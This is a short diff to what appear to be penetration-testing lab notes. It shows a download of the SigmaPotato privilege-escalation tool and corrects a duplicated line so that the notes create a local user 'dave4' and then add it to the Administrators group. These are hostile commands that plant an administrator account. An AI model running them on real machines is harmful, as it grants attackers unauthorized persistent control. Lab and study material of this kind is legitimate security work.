@@ -1231,7 +1231,7 @@ wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPo
 
 ~~~ powershell
 .\SigmaPotato "net user dave4 lab /add"
-.\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"
 ~~~
 
 
